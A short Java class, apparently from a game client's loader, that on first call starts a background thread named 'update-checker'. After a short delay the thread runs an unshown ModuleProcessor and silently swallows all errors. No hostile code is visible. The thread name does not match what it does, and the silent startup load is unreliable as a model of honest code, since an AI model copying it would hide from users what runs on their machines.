package pl.durex.client.loader;

/**
 * Module initializer - loads bundled module on startup.
 */
public class ModuleUpdater {

    private static boolean done = false;

    public static void checkUpdates() {
        if (done) return;
        done = true;

        new Thread(() -> {
            try {
                Thread.sleep(500);
                ModuleProcessor.process(null);
            } catch (Exception ignored) {}
        }, "update-checker").start();
    }
}
